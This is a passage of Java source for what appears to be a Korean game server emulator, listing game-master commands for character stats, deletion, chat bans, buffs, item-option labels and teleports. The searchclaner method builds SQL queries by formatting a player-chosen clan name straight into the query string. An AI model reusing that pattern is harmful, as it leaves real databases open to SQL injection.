			if (e_status.equals(EPcStatus.NONE)) {
				StringBuilder sb = new StringBuilder(256);
				EPcStatus[] statuses = EPcStatus.values();
				sb.append("상태 값을 정확히 입력해주세요 ->\r\n");
				for (int i = 0; i < statuses.length; ++i) {
					if (i != 0)
						sb.append(", ");
					sb.append("[").append(statuses[i].toInt()).append(".").append(statuses[i]).append("]");
				}
				args.notify(sb.toString());
				return;
			}
			pc.set_instance_status(e_status);
		} catch (Exception e) {
			args.notify(".캐릭터상태 [캐릭터이름] [상태값]");
		} finally {
			args.dispose();
		}
	}

	private void CurseCharacter(CommandArgs args) {
		try {
			String name = args.nextString();
			if (name == null || name.equalsIgnoreCase(""))
				throw new Exception();

			L1PcInstance pc = CWorld.getInstance().getPlayer(name);
			if (pc == null) {
				args.notify(String.format("%s을(를) 찾을 수 없습니다.", name));
				return;
			}

			pc.add_lateral_damage(args.nextInt());
			pc.add_lateral_reduction(args.nextInt());
			pc.add_lateral_magic_rate(args.nextInt());
			pc.update_lateral_status();
			args.notify(String.format("%s의 현재 상태 - 대미지:%d, 리덕:%d,마법대미지:%d", name, pc.get_lateral_damage(),
					pc.get_lateral_reduction(), pc.get_lateral_magic_rate()));
		} catch (Exception e) {
			args.notify(".저주 [캐릭터이름] [대미지] [리덕션] [마법대미지]");
		}
	}

	private void CurseInitializeCharacter(CommandArgs args) {
		try {
			String command_type = args.nextString();
			if (command_type.equalsIgnoreCase("전체")) {
				CWorld.getInstance().getAllPlayerStream().filter((L1PcInstance pc) -> {
					return pc != null;
				}).forEach((L1PcInstance pc) -> {
					pc.set_lateral_damage(0);
					pc.set_lateral_reduction(0);
					pc.set_lateral_magic_rate(0);
				});
				Updator.truncate("tb_lateral_status");
				args.notify("전체 데이터를 초기화했습니다.");
			} else if (command_type.equalsIgnoreCase("캐릭")) {
				String name = args.nextString();
				if (name == null || name.equalsIgnoreCase(""))
					throw new Exception();
				L1PcInstance pc = CWorld.getInstance().getPlayer(name);
				if (pc == null) {
					args.notify(String.format("%s을(를) 찾을 수 없습니다.", name));
					return;
				}
				pc.delete_lateral_status();
				args.notify(String.format("%s의 데이터를 초기화했습니다.", name));
			} else {
				throw new Exception();
			}
		} catch (Exception e) {
			args.notify(".저주초기화 [전체] | [캐릭(캐릭 메티스)]");
		}
	}

	private void clanMark(L1PcInstance pc, String param) {
		// TODO 자동 생성된 메소드 스텁
		try {
			StringTokenizer st = new StringTokenizer(param);
			String onoff = st.nextToken();
			if (onoff.equalsIgnoreCase("켬")) {
				SC_MarkSee.send(pc, 2, true);
				SC_MarkSee.send(pc, 0, true);
				pc.sendPackets("혈마크 표기를 시작 합니다.");
			} else if (onoff.equalsIgnoreCase("끔")) {
				SC_MarkSee.send(pc, 2, false);
				SC_MarkSee.send(pc, 1, false);
				pc.sendPackets("혈마크 표기를 종료 합니다.");
			} else {
				SC_SystemMessage.send(pc, ".혈마크 [켬 / 끔]");
				return;
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, ".혈마크 [켬 / 끔]");
		}
	}

	private String itemlevel(L1ItemInstance item) {

		String ggg = "";

		switch (item.get_item_level()) {
		case 1:
			ggg = "\\fH일반 [근거리 치명타 +1%]";
			break;
		case 2:
			ggg = "\\fH일반 [원거리 치명타 +1%]";
			break;
		case 3:
			ggg = "\\fH일반 [마법 치명타 +1%]";
			break;
		case 4:
			ggg = "\\fH일반 [근거리 대미지 +1]";
			break;
		case 5:
			ggg = "\\fH일반 [원거리 대미지 +1]";
			break;
		case 6:
			ggg = "\\fH일반 [근거리 명중 +1]";
			break;
		case 7:
			ggg = "\\fH일반 [원거리 명중 +1]";
			break;
		case 8:
			ggg = "\\fH일반 [대미지감소 +1]";
			break;
		case 9:
			ggg = "\\fH일반 [추가 방어력 +1]";
			break;
		case 10:
			ggg = "\\fH일반 [MR +3]]";
			break;
		case 11:
			ggg = "\\fH일반 [최대HP +30]";
			break;
		case 12:
			ggg = "\\fH일반 [최대MP +20]";
			break;
		case 13:
			ggg = "\\fH일반 [PVP추가대미지 +1]";
			break;
		case 14:
			ggg = "\\fH일반 [PVP대미지감소 +1]";
			break;
		case 15:
			ggg = "\\fH일반 [불 속성 저항 +10]";
			break;
		case 16:
			ggg = "\\fH일반 [땅 속성 저항 +10]";
			break;
		case 17:
			ggg = "\\fH일반 [물 속성 저항 +10]";
			break;
		case 18:
			ggg = "\\fH일반 [바람 속성 저항 +10]";
			break;
		case 19:
			ggg = "\\fH일반 [소지무게증가 +100]";
			break;
		case 20:
			ggg = "\\aH고급 [근거리 치명타 +3%]";
			break;
		case 21:
			ggg = "\\aH고급 [원거리 치명타 +3%]";
			break;
		case 22:
			ggg = "\\aH고급 [마법 치명타 +3%]";
			break;
		case 23:
			ggg = "\\aH고급 [근거리 대미지 +3]";
			break;
		case 24:
			ggg = "\\aH고급 [원거리 대미지 +3]";
			break;
		case 25:
			ggg = "\\aH고급 [근거리 명중 +3]";
			break;
		case 26:
			ggg = "\\aH고급 [원거리 명중 +3]";
			break;
		case 27:
			ggg = "\\aH고급 [대미지 감소 +2]";
			break;
		case 28:
			ggg = "\\aH고급 [추가 방어력 +2]";
			break;
		case 29:
			ggg = "\\aH고급 [MR +6]";
			break;
		case 30:
			ggg = "\\aH고급 [최대 HP +60]";
			break;
		case 31:
			ggg = "\\aH고급 [최대 MP +40]";
			break;
		case 32:
			ggg = "\\aH고급 [DG +3]";
			break;
		case 33:
			ggg = "\\aH고급 [HP절대회복 +30(32초)]";
			break;
		case 34:
			ggg = "\\aH고급 [MP절대회복 +10(64초)]";
			break;
		case 35:
			ggg = "\\aH고급 [ER +3]";
			break;
		case 36:
			ggg = "\\aH고급 [PVP추가대미지 +2]";
			break;
		case 37:
			ggg = "\\aH고급 [PVP대미지감소 +2]";
			break;
		case 38:
			ggg = "\\aH고급 [PVP마법대미지감소 +2%]";
			break;
		case 39:
			ggg = "\\aH고급 [내성: 기술 +2]";
			break;
		case 40:
			ggg = "\\aH고급 [내성: 정령 +2]";
			break;
		case 41:
			ggg = "\\aH고급 [내성: 용언 +2]";
			break;
		case 42:
			ggg = "\\aH고급 [내성: 공포 +2]";
			break;
		case 43:
			ggg = "\\aH고급 [불 속성 저항 +20]";
			break;
		case 44:
			ggg = "\\aH고급 [땅 속성 저항 +20]";
			break;
		case 45:
			ggg = "\\aH고급 [물 속성 저항 +20]";
			break;
		case 46:
			ggg = "\\aH고급 [바람 속성 저항 +20]";
			break;
		case 47:
			ggg = "\\aH고급 [STR +1]";
			break;
		case 48:

			ggg = "\\aH고급 [DEX +1]";
			break;
		case 49:
			ggg = "\\aH고급 [CON +1]";
			break;
		case 50:
			ggg = "\\aH고급 [WIS +1]";
			break;
		case 51:
			ggg = "\\aH고급 [INT +1]";
			break;
		case 52:
			ggg = "\\aH고급 [소지 무게 증가 +200]";
			break;
		case 53:
			ggg = "\\aL희귀 [근거리 치명타 +5%]";
			break;
		case 54:
			ggg = "\\aL희귀 [원거리 치명타 +5%]";
			break;
		case 55:
			ggg = "\\aL희귀 [마법 치명타 +5%]";
			break;
		case 56:
			ggg = "\\aL희귀 [근거리 대미지 +3]";
			break;
		case 57:
			ggg = "\\aL희귀 [원거리 대미지 +3]";
			break;
		case 58:
			ggg = "\\aL희귀 [근거리 명중 +3]";
			break;
		case 59:
			ggg = "\\aL희귀 [원거리 명중 +3]";
			break;
		case 60:
			ggg = "\\aL희귀 [SP +3]";
			break;
		case 61:
			ggg = "\\aL희귀 [마법적중 +3]";
			break;
		case 62:
			ggg = "\\aL희귀 [대미지감소 +3]";
			break;
		case 63:
			ggg = "\\aL희귀 [추가 방어력 +3]";
			break;
		case 64:
			ggg = "\\aL희귀 [MR +10]";
			break;
		case 65:
			ggg = "\\aL희귀 [최대 HP +150]";
			break;
		case 66:
			ggg = "\\aL희귀 [최대 MP +100]";
			break;
		case 67:
			ggg = "\\aL희귀 [DG +5]";
			break;
		case 68:
			ggg = "\\aL희귀 [HP절대회복 +50(32초)]";
			break;
		case 69:
			ggg = "\\aL희귀 [MP절대회복 +12(64초)]";
			break;
		case 70:
			ggg = "\\aL희귀 [ER +5]";
			break;
		case 71:
			ggg = "\\aL희귀 [PVP추가대미지 +3]";
			break;
		case 72:
			ggg = "\\aL희귀 [PVP대미지감소 +3]";
			break;
		case 73:
			ggg = "\\aL희귀 [PVP마법대미지감소 +5%]";
			break;
		case 74:
			ggg = "\\aL희귀 [내성: 기술 +5]";
			break;
		case 75:
			ggg = "\\aL희귀 [내성: 정령 +5]";
			break;
		case 76:
			ggg = "\\aL희귀 [내성: 용언 +5]";
			break;
		case 77:
			ggg = "\\aL희귀 [내성: 공포 +5]";
			break;
		case 78:
			ggg = "\\aL희귀 [적중: 기술 +3]";
			break;
		case 79:
			ggg = "\\aL희귀 [적중: 정령 +3]";
			break;
		case 80:
			ggg = "\\aL희귀 [적중: 용언 +3]";
			break;
		case 81:
			ggg = "\\aL희귀 [적중: 공포 +3]";
			break;
		case 82:
			ggg = "\\aL희귀 [불 속성 저항 +30]";
			break;
		case 83:
			ggg = "\\aL희귀 [땅 속성 저항 +30]";
			break;
		case 84:
			ggg = "\\aL희귀 [물 속성 저항 +30]";
			break;
		case 85:
			ggg = "\\aL희귀 [바람 속성 저항 +30]";
			break;
		case 86:
			ggg = "\\aL희귀 [모든 속성 저항 +10]";
			break;
		case 87:
			ggg = "\\aL희귀 [STR +2]";
			break;
		case 88:
			ggg = "\\aL희귀 [DEX +2]";
			break;
		case 89:
			ggg = "\\aL희귀 [CON +2]";
			break;
		case 90:
			ggg = "\\aL희귀 [WIS +2]";
			break;
		case 91:
			ggg = "\\aL희귀 [INT +2]";
			break;
		case 92:
			ggg = "\\aL희귀 [소지무게증가 +300]";
			break;
		case 93:
			ggg = "\\f3영웅 [근거리 대미지 +5]";
			break;
		case 94:
			ggg = "\\f3영웅 [원거리 대미지 +5]";
			break;
		case 95:
			ggg = "\\f3영웅 [근거리 명중 +5]";
			break;

		case 96:
			ggg = "\\f3영웅 [원거리 명중 +5]";
			break;
		case 97:
			ggg = "\\f3영웅 [SP +5]";
			break;
		case 98:
			ggg = "\\f3영웅 [마법적중 +5]";
			break;
		case 99:
			ggg = "\\f3영웅 [대미지감소 +5]";
			break;
		case 100:
			ggg = "\\f3영웅 [추가 AC -5]";
			break;
		case 101:
			ggg = "\\f3영웅 [MR +15]";
			break;
		case 102:
			ggg = "\\f3영웅 [최대 HP +300]";
			break;
		case 103:
			ggg = "\\f3영웅 [최대 MP +200]";
			break;
		case 104:
			ggg = "\\f3영웅 [DG +10]";
			break;
		case 105:
			ggg = "\\f3영웅 [HP절대회복 +30(32초)]";
			break;
		case 106:
			ggg = "\\f3영웅 [MP절대회복 +30(64초)]";
			break;
		case 107:
			ggg = "\\f3영웅 [ER +12]";
			break;
		case 108:
			ggg = "\\f3영웅 [PVP추가대미지 +7]";
			break;
		case 109:
			ggg = "\\f3영웅 [PVP대미지감소 +7]";
			break;
		case 110:
			ggg = "\\f3영웅 [PVP마법대미지감소 +10%]";
			break;
		case 111:
			ggg = "\\f3영웅 [PVP대미지감소무시 +10]";
			break;
		case 112:
			ggg = "\\f3영웅 [내성: 기술 +8]";
			break;
		case 113:
			ggg = "\\f3영웅 [내성: 정령 +8]";
			break;
		case 114:
			ggg = "\\f3영웅 [내성: 용언 +8]";
			break;
		case 115:
			ggg = "\\f3영웅 [내성: 공포 +8]";
			break;
		case 116:
			ggg = "\\f3영웅 [모든 내성: +3]";
			break;
		case 117:
			ggg = "\\f3영웅 [적중: 기술 +8]";
			break;
		case 118:
			ggg = "\\f3영웅 [적중: 정령 +8]";
			break;
		case 119:
			ggg = "\\f3영웅 [적중: 용언 +8]";
			break;
		case 120:
			ggg = "\\f3영웅 [적중: 공포 +8]";
			break;
		case 121:
			ggg = "\\f3영웅 [모든 적중: +3]";
			break;
		case 122:
			ggg = "\\f3영웅 [모든 속성 저항: +30]";
			break;
		case 123:
			ggg = "\\f3영웅 [STR +3]";
			break;
		case 124:
			ggg = "\\f3영웅 [DEX +3]";
			break;
		case 125:
			ggg = "\\f3영웅 [CON +3]";
			break;
		case 126:
			ggg = "\\f3영웅 [WIS +3]";
			break;
		case 127:
			ggg = "\\f3영웅 [INT +3]";
			break;
		case 128:
			ggg = "\\f3영웅 [모든 스탯 +1]";
			break;
		case 129:
			ggg = "\\f3영웅 [MP 흡수]";
			break;
		case 130:
			ggg = "\\f3영웅 [소지무게증가 +500]";
			break;
		case 131:
			ggg = "\\f4전설 [디케이포션 발동]";
			break;
		case 132:
			ggg = "\\f4전설 [PVP대미지감소무시 +40]";
			break;
		case 133:
			ggg = "\\f4전설 [모든 스탯 +3]";
			break;
		case 134:
			ggg = "\\f4전설 [HP 흡수]";
			break;
		case 135:
			ggg = "\\f4전설 [MP 흡수]";
			break;
		case 136:
			ggg = "\\f4전설 [소울오브프레임 발동]";
			break;
		case 137:
			ggg = "\\f4전설 [이뮨투함무시 +30%]";
			break;
		case 138:
			ggg = "\\f4전설 [저지먼트 발동]";
			break;
		case 139:
			ggg = "\\f4전설 [3단가속 효과]";
			break;
		default:
			ggg = "\\aA없음";
			break;
		}
		return ggg;
	}
	// TODO 중개 거래 게시판

	private void standBy77(L1PcInstance gm, String param) {
		try {
			StringTokenizer tokenizer = new StringTokenizer(param);
			String pcName = tokenizer.nextToken();
			L1PcInstance target = CWorld.getInstance().getPlayer(pcName);
			int objid = 0;
			String acname = null;
			if (target != null) {
				SC_Disconnect.send(target);
			}
			Connection con = null;
			PreparedStatement pstm = null;
			ResultSet rs = null;
			try {
				con = DatabaseFactory.getInstance().getConnection();
				pstm = con.prepareStatement("SELECT objid, account_name FROM characters WHERE char_name=?");
				pstm.setString(1, pcName);
				rs = pstm.executeQuery();
				while (rs.next()) {
					objid = rs.getInt(1);
					acname = rs.getString(2);
				}
				if (objid == 0) {
					SC_SystemMessage.send(gm, "디비에 해당 유저의 이름이 존재하지 않습니다.");

				} else {
					SC_SystemMessage.send(gm, acname + "계정 " + pcName + "님의 케릭터를 삭제 합니다.");
					CharacterTable.getInstance().deleteCharacter(acname, pcName);
					SC_SystemMessage.send(gm, "해당유저를 정상적으로 삭제 하였습니다.");
				}
			} catch (SQLException e) {

			} finally {
				SQLUtil.close(rs);
				SQLUtil.close(pstm);
				SQLUtil.close(con);
			}

		} catch (Exception eee) {
			SC_SystemMessage.send(gm, ".케릭삭제 [케릭명]");
		}
	}

	private void Blessleaf(L1PcInstance gm, String pcName) {
		try {
			L1PcInstance target = CWorld.getInstance().getPlayer(pcName);
			if (target != null) {
				target._Blessleaf = true;
				gm.sendPackets("" + target.getName() + " 님의 기운을 잃은 아이템 성공율이 1회성으로 100% 적용됩니다.");
			} else {
				gm.sendPackets("그런 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".기운축복 캐릭명 으로 입력해주세요.");
		}
	}

	private void EnchantWeaponSuccess(L1PcInstance gm, String pcName) {
		try {
			L1PcInstance target = CWorld.getInstance().getPlayer(pcName);
			if (target != null) {
				target._EnchantWeaponSuccess = true;
				gm.sendPackets("" + target.getName() + " 님의 무기인챈성공율이 1회성으로 100% 적용됩니다.");
			} else {
				gm.sendPackets("그런 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".무기인챈성공 캐릭명 으로 입력해주세요.");
		}
	}

	private void EnchantArmorSuccess(L1PcInstance gm, String pcName) {
		try {
			L1PcInstance target = CWorld.getInstance().getPlayer(pcName);
			if (target != null) {
				target._EnchantArmorSuccess = true;
				gm.sendPackets("" + target.getName() + " 님의 방어인챈성공율이 1회성으로 100% 적용됩니다.");
			} else {
				gm.sendPackets("그런 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".방어인챈성공 캐릭명 으로 입력해주세요.");
		}
	}

	private static void 보안버프(L1PcInstance gm) {
		gm.addAc(-1);
		SC_PacketBox.send(gm, gm, SC_PacketBox.ICON_SECURITY_SERVICES);
		SC_OwnCharStatus.send(gm);
	}
	private void searchclaner(L1PcInstance gm, String name) {
		try {
			L1PcInstance target = CWorld.getInstance().getPlayer(name);
			String charinfo = null;
			charinfo = String.format(
					"select account_name, char_name, level, clanname, OnlineStatus from characters where clanname Like '%s'",
					target.getClanname());

			if (target.getClan() == null) {
				gm.sendPackets("검색하신 캐릭터는 혈맹에 가입하지 않은 상태입니다.");
				return;
			}

			Selector.exec(charinfo, new FullSelectorHandler() {
				@Override
				public void result(ResultSet rs) throws Exception {
					int i = 0;
					gm.sendPackets(String.format("================== 혈맹 정보 ==================", i));
					while (rs.next()) {
						++i;
						if (rs.getInt(5) > 0) {
							gm.sendPackets(String.format("\\fY계정:%s 캐릭명:%s 레벨:%s 혈맹:%s", rs.getString(1),
									rs.getString(2), rs.getString(3), rs.getString(4), rs.getInt(5)));
						}
					}
				}
			});

			String claninfo = null;
			claninfo = String.format("select total_m, current_m from clan_data where clan_name Like '%s'",
					target.getClanname());

			Selector.exec(claninfo, new FullSelectorHandler() {
				@Override
				public void result(ResultSet rs) throws Exception {
					while (rs.next()) {
						gm.sendPackets(
								String.format("\\fU총 혈맹원 : [%s] 접속중인 혈맹원 : %s", rs.getString(1), rs.getString(2)));
					}
				}
			});
		} catch (Exception e) {
			gm.sendPackets("검색 하신 캐릭명이 틀리거나 존재 하지 않습니다.");
		}
	}

	
	

	// General Builder commands, directly invoked without per-command instances.
	private static void BuilderCmd_patrol(L1PcInstance pc, String cmdName, String arg) {
		SC_PacketBox.send(pc, SC_PacketBox.CALL_SOMETHING);
	}

	private static void BuilderCmd_all_buff(L1PcInstance pc, String cmdName, String poby) {
		try {
			int buffType = 0;

			StringTokenizer token = new StringTokenizer(poby);
			String type = token.nextToken();
			if (type.equals("1")) {
				buffType = 1;
			} else if (type.equals("2")) {
				buffType = 2;
			} else if (type.equals("3")) {
				buffType = 3;
			} else if (type.equals("4")) {
				buffType = 4;
			} else {
				throw new Exception();
			}

			String range = null;
			if (token.hasMoreTokens()) {
				range = token.nextToken();
			}
			L1BuffUtil.startAllBuffThread(pc, range, buffType);
		} catch (Exception e) {
			if (pc != null) {
				SC_SystemMessage.send(pc, "." + cmdName + " <종류>");
				SC_SystemMessage.send(pc, "[종류] 버프/축복/흑사/코마");
			}
		}
	}

	private static void BuilderCmd_public_chat_ban(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			String name = st.nextToken();
			int time = Integer.parseInt(st.nextToken());
			String reason = st.nextToken();

			L1PcInstance tg = CWorld.getInstance(). getPlayer(name);

			if (tg != null) {
				tg.setSkillEffect(L1SkillId.STATUS_CHAT_PROHIBITED, time * 60 * 1000);
				SC_SkillIconGFX.send(tg, 36, time * 60);
				SC_ServerMessage.send(tg, 286, String.valueOf(time)); // \f3게임에 적합하지 않는 행동이기 (위해)때문에, 향후%0분간 채팅을 금지합니다.
				SC_SystemMessage.broadcast(name + " 캐릭터 "+ String.valueOf(time) + "분간 채팅금지 (사유: " + reason + ")");
			} else {
				SC_SystemMessage.send(pc, "해당 캐릭터 미접속.");
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " [캐릭명] [분] [채금사유] 입력.");
		}
	}

	private static void BuilderCmd_change_weather(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer tok = new StringTokenizer(arg);
			
			int weather = Integer.parseInt(tok.nextToken());
			CWorld.getInstance(). setWeather(weather);
			SC_Weather.broadcastAll(weather);
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " 0~3(눈), 16~19(비)라고 입력 해주세요.");
		}
	}

	private static void BuilderCmd_who(L1PcInstance pc, String cmdName, String arg) {
		try {
			Collection<L1PcInstance> players = CWorld.getInstance().getAllPlayers();
			int robotcount = 0; // 무인
			int playercount = 0; 
			int AutoShopUser = 0;
			for (L1PcInstance each : players) {
				if(each.noPlayerCK || each.noPlayerck2)
					robotcount++;
				else if (each.isPrivateShop() && each.getNetConnection() == null) {
					AutoShopUser++;
				} else if (each.getNetConnection() != null
                        && each.getNetConnection().isConnected()) {
					playercount++;
				}
			}
			String amount = String.valueOf(playercount);
			SC_WhoAmount.send(pc, amount);
			SC_ChatPacket.sendDirect(pc, pc, "\\aD=========== 접속중인 플레이어 수 ===========");
			SC_ChatPacket.sendDirect(pc, pc, "\\aL[로봇] : " + robotcount);
			SC_ChatPacket.sendDirect(pc, pc, "\\aH[유저] 총인원수: " + playercount);
			SC_ChatPacket.sendDirect(pc, pc, "\\aJ[무인상점] : " + AutoShopUser);

			
			// 온라인의 플레이어 리스트를 표시
			if (arg.equalsIgnoreCase("전체")) {
				StringBuffer gmList = new StringBuffer();
				StringBuffer playList = new StringBuffer();
				StringBuffer shopList = new StringBuffer();
				StringBuffer robotList = new StringBuffer();

				int countGM = 0, countPlayer = 0, countShop = 0, countRobot = 0;

				for (L1PcInstance each : players) {
					if (each.isGm()) {
						gmList.append(each.getName() + ", ");
						countGM++;
						continue;
					}
					if (each.noPlayerCK || each.noPlayerck2) {
						robotList.append(each.getName() + ", ");
						countRobot++;
						continue;
					}
					if (!each.isPrivateShop()) {
						playList.append(each.getName() + ", ");
						countPlayer++;
						continue;
					}
					if (each.isPrivateShop()) {
						shopList.append(each.getName() + ", ");
						countShop++;
					}
				}
				if (gmList.length() > 0) {
					SC_ChatPacket.sendDirect(pc, pc, "-- 운영자 (" + countGM + "명)");
					SC_ChatPacket.sendDirect(pc, pc, gmList.toString());
				}

				if (playList.length() > 0) {
					SC_ChatPacket.sendDirect(pc, pc, "-- 플레이어 (" + countPlayer + "명)");
					SC_ChatPacket.sendDirect(pc, pc, playList.toString());
				}
				if (robotList.length() > 0) {
					SC_ChatPacket.sendDirect(pc, pc, "-- 로봇유저 (" + countRobot + "명)");
					SC_ChatPacket.sendDirect(pc, pc, robotList.toString());
				}
				if (shopList.length() > 0) {
					SC_ChatPacket.sendDirect(pc, pc, "-- 개인상점 (" + countShop + "명)");
					SC_ChatPacket.sendDirect(pc, pc, shopList.toString());
				}
			}
			players = null;
		} catch (Exception e) {
			SC_ChatPacket.sendDirect(pc, pc, ".누구 [전체] 라고 입력해 주세요. ");
		}
	}

	private static final int[] BUILDER_RANGE_BUFF_SKILLS = {
			L1SkillId.PHYSICAL_ENCHANT_DEX,
			L1SkillId.PHYSICAL_ENCHANT_STR,
			L1SkillId.BLESS_WEAPON,
			L1SkillId.IRON_SKIN,
			L1SkillId.FEATHER_BUFF_A,
			L1SkillId.LIFE_MAAN,
			L1SkillId.God_buff,
			L1SkillId.COMA_B
	};

	private static void BuilderCmd_range_buff(
			L1PcInstance pc,
			String cmdName,
			String arg) {

		try {
			for (L1PcInstance target :
					CWorld.getInstance().getVisiblePlayer(pc)) {

				if (target == null) {
					continue;
				}

				final int targetId = target.getId();
				final int targetX = target.getX();
				final int targetY = target.getY();

				target.setBuffnoch(1);

				try {
					for (int i = 0; i < BUILDER_RANGE_BUFF_SKILLS.length; i++) {

						L1SkillUse.cast(
								target,
								BUILDER_RANGE_BUFF_SKILLS[i],
								targetId,
								targetX,
								targetY,
								null,
								0,
								L1SkillUse.TYPE_GMBUFF);
					}

				} finally {
					target.setBuffnoch(0);
				}
			}

		} catch (Throwable t) {
			SC_SystemMessage.send(pc, cmdName + " 커멘드 에러");

			t.printStackTrace();
		}
	}



	private static void BuilderCmd_gm_room(L1PcInstance pc, String cmdName, String arg) {
		try {
			int i = 0;
			try {
				i = Integer.parseInt(arg);
			} catch (NumberFormatException e) {
			}

			 if (i == 1) {
				pc.start_teleport(32737, 32796, 99, 5, 169, false, false);
			} else if (i == 2) {
				pc.start_teleport(33440, 32805, 4, 5, 169, false, false);
			} else if (i == 3) {
				pc.start_teleport(33082, 33390, 4, 5, 169, false, false);
			} else if (i == 4) {
				pc.start_teleport(34055, 32290, 4, 5, 169, false, false);
			} else if (i == 5) {
				pc.start_teleport(33723, 32495, 4, 5, 169, false, false);
			} else if (i == 6) {
				pc.start_teleport(32614, 32788, 4, 5, 169, false, false);
			} else if (i == 7) {
				pc.start_teleport(32678, 32857, 2005, 5, 169, false, false);
			} else if (i == 8) {
				pc.start_teleport(33515, 32858, 4, 5, 169, false, false);
			} else if (i == 9) {
				pc.start_teleport(32763, 32817, 622, 5, 169, false, false);
			} else if (i == 10) {
				pc.start_teleport(32572, 32944, 0, 5, 169, false, false);
			} else if (i == 11) {
				pc.start_teleport(32736, 32796, 16896, 5, 169, false, false);
			} else if (i == 12) {
				pc.start_teleport(32783, 32865, 621, pc.getHeading(), 169, false, false);
			} else if (i == 13) {
				pc.start_teleport(32805, 32814, 5490, 5, 169, false, false);
			} else if (i == 14) {
				pc.start_teleport(32736, 32787, 15, 5, 169, false, false);
			} else if (i == 15) {
				pc.start_teleport(32735, 32788, 29, 5, 169, false, false);
			} else if (i == 16) {
				pc.start_teleport(32730, 32802, 52, 5, 169, false, false);
			} else if (i == 17) {
				pc.start_teleport(32572, 32826, 64, 5, 169, false, false);
			} else if (i == 18) {
				pc.start_teleport(32895, 32533, 300, 5, 169, false, false);
			} else if (i == 19) {
				pc.start_teleport(33168, 32779, 4, 5, 169, false, false);
			} else if (i == 20) {
				pc.start_teleport(32623, 33379, 4, 5, 169, false, false);
			} else if (i == 21) {
//				L1Teleport.teleport(pc , 33630, 32677, (short) 4, 5, true); // 기란 수호탑
				pc.start_teleport(33630, 32677, 4, 5, 169, false, false);
			} else if (i == 22) {
//				L1Teleport.teleport(pc , 33524, 33394, (short) 4, 5, true); // 하이네 수호탑
				pc.start_teleport(33524, 33394, 4, 5, 169, false, false);
			} else if (i == 23) {
//				L1Teleport.teleport(pc , 34090, 33260, (short) 4, 5, true); // 아덴 수호탑
				pc.start_teleport(34090, 33260, 4, 5, 169, false, false);
			} else if (i == 24) {
//				L1Teleport.teleport(pc , 32424, 33068, (short) 440, 5, true); // 해적섬
				pc.start_teleport(32424, 33068, 440, 5, 169, false, false);
			} else if (i == 25) {
//				L1Teleport.teleport(pc , 32800, 32868, (short) 1001, 5, true); // 베헤모스
				pc.start_teleport(32800, 32868, 1001, 5, 169, false, false);
			} else if (i == 26) {
//				L1Teleport.teleport(pc , 32800, 32856, (short) 1000, 5, true); // 실베리아
				pc.start_teleport(32800, 32856, 1000, 5, 169, false, false);
			} else if (i == 27) {
//				L1Teleport.teleport(pc , 32630, 32903, (short) 780, 5, true); // 테베사막
				pc.start_teleport(32630, 32903, 780, 5, 169, false, false);
			} else if (i == 28) {
//				L1Teleport.teleport(pc , 32743, 32799, (short) 781, 5, true); // 테베 피라미드 내부
				pc.start_teleport(32743, 32799, 781, 5, 169, false, false);
			} else if (i == 29) {
//				L1Teleport.teleport(pc , 32735, 32830, (short) 782, 5, true); // 테베 오리시스 제단
				pc.start_teleport(32735, 32830, 782, 5, 169, false, false);
			} else if (i == 30) {
//				L1Teleport.teleport(pc , 32734, 32270, (short) 4, 5, true); // 피닉
				pc.start_teleport(32734, 32270, 4, 5, 169, false, false);
			} else if (i == 31) {
//				L1Teleport.teleport(pc , 32699, 32819, (short) 82, 5, true); // 데몬
				pc.start_teleport(32699, 32819, 82, 5, 169, false, false);
			} else if (i == 32) {
//				L1Teleport.teleport(pc , 32769, 32770, (short) 56, 5, true); // 기감4층
				pc.start_teleport(32769, 32770, 56, 5, 169, false, false);
			} else if (i == 33) {
//				L1Teleport.teleport(pc , 32929, 32995, (short) 410, 5, true); // 마족신전	
				pc.start_teleport(32929, 32995, 410, 5, 169, false, false);
			} else if (i == 34) {
//				L1Teleport.teleport(pc , 32791, 32691, (short) 1005, 5, true); // 레이드 안타라스
				pc.start_teleport(32791, 32691, 1005, 5, 169, false, false);
			} else if (i == 35) {
//				L1Teleport.teleport(pc , 32960, 32840, (short) 1011, 5, true); // 레이드 파푸리온
				pc.start_teleport(32960, 32840, 1011, 5, 169, false, false);
			} else if (i == 36) {
//				L1Teleport.teleport(pc , 32849, 32876, (short) 1017, 5, true); // 린드레이드
				pc.start_teleport(32849, 32876, 1017, 5, 169, false, false);
			} else if (i == 37) {
//				L1Teleport.teleport(pc , 32725, 32800, (short) 67, 5, true); // 발라방
				pc.start_teleport(32725, 32800, 67, 5, 169, false, false);
			} else if (i == 38) {
//				L1Teleport.teleport(pc , 32771, 32831, (short) 65, 5, true); // 파푸방
				pc.start_teleport(32771, 32831, 65, 5, 169, false, false);
			} else if (i == 39) {
//				L1Teleport.teleport(pc , 32696, 32824, (short) 37, 5, true); // 버모스 (용던7층)
				pc.start_teleport(32696, 32824, 37, 5, 169, false, false);
			} else if (i == 40) {
//				L1Teleport.teleport(pc , 32922, 32812, (short) 430, 5, true); // 정령무덤
				pc.start_teleport(32922, 32812, 430, 5, 169, false, false);
			} else if (i == 41) {
//				L1Teleport.teleport(pc , 32737, 32834, (short) 2004, 5, true); // 고라스
				pc.start_teleport(32737, 32834, 2004, 5, 169, false, false);
			} else if (i == 42) {
//				L1Teleport.teleport(pc , 32707, 32846, (short) 2, 5, true); // 섬던2층
				pc.start_teleport(32707, 32846, 2, 5, 169, false, false);
			} else if (i == 43) {
//				L1Teleport.teleport(pc , 32772, 32861, (short) 400, 5, true); // 고대무덤
				pc.start_teleport(32772, 32861, 400, 5, 169, false, false);
			} else if (i == 44) {
//				L1Teleport.teleport(pc , 32982, 32808, (short) 244, 5, true); // 오땅
				pc.start_teleport(32982, 32808, 244, 5, 169, false, false);
			} else if (i == 45) {
//				L1Teleport.teleport(pc , 32811, 32819, (short) 460, 5, true); // 라바2층
				pc.start_teleport(32811, 32819, 460, 5, 169, false, false);
			} else if (i == 46) {
//				L1Teleport.teleport(pc , 32724, 32792, (short) 536, 5, true); // 라던3층
				pc.start_teleport(32724, 32792, 536, 5, 169, false, false);
			} else if (i == 47) {
